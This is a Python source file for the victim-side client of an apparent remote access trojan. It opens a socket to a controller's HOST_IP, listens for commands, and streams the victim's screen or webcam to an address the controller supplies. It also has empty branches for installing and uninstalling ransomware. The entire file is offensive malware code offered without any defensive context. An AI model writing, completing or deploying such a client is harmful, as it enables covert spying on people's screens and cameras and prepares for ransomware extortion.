import threading
from victim_constants import *
import socket
import ScreenSharing.sharer.sharer as scSharer
import WebCamSharing.sharer.sharer as wcSharer

soc = None

def connectToServer():
    print("Connecting to host...")

    global soc
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((HOST_IP, HOST_PORT))
    
    print("Successfully connected!")

def getCommand():
    command = soc.recv(1024).decode()
    print(f"Recv command! : {command}")
    return command

def processCommand(command):
    if command == WATCH_SCREEN_COMMAND:
        ip, port = soc.recv(1024).decode().split(' ')
        threading.Thread(target= handleScreenSharing, args=(ip, int(port))).start()
        
    elif command == WATCH_WEBCAM_COMMAND:
        ip, port = soc.recv(1024).decode().split(' ')
        threading.Thread(target= handleWebCameraSharing, args=(ip, int(port))).start()

    elif command == INSTALL_RANSOMWARE_COMMAND:
        pass

    elif command == UNINSTALL_RANSOMWARE_COMMAND:
        pass


def handleScreenSharing(ip ,port):
    screenShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    screenShareSoc.connect((ip, port))

    scSharer.shareScreen(screenShareSoc)

def handleWebCameraSharing(ip ,port):
    screenShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    screenShareSoc.connect((ip, port))

    wcSharer.shareWebCam(screenShareSoc)

def main():
    connectToServer()

    while True:
        command = getCommand()
        processCommand(command)

if __name__ == "__main__":
    main()